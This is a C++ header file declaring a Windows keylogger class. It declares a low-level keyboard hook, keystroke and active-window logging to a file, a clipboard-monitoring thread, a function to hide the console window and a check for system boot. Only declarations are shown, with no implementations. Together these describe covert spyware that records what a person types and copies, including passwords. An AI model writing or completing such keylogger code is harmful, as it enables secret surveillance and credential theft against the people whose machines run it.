#pragma once
#include <windows.h>
#include <string>
#include <fstream>
#include <set>
#include "config.hpp"
#include <json.hpp>
#include <filesystem>

class Keylogger {
private:
    HHOOK hookHandle;
    std::ofstream logFile;
    char lastWindow[256]{};
    std::set<int> pressedKeys; // Track currently pressed keys
    const Config* config;
    // Removed lastClipboardText; clipboard state is managed in the thread function
public:
    Keylogger(const std::string& filename, const Config& config);
    ~Keylogger();
    void InstallHook();
    void RemoveHook();
    void Run();
    void LogKeystroke(int vkCode, bool isKeyDown);
    void LogKey(int vkCode);
    static LRESULT CALLBACK HookCallback(int nCode, WPARAM wParam, LPARAM lParam);
    static void SetConsoleVisibility(const Config& config);
    static bool IsSystemBooting(const Config& config);
    static Keylogger& GetInstance(const Config& config);
    static Keylogger& GetInstance(); // Uses global g_config_ptr, must be set before use
    void StartClipboardMonitor();
    static void ClipboardMonitorThread(const Config* config);
    // Add a public static function to run clipboard monitoring as a thread
    static void RunClipboardMonitor(const Config* config);
}; 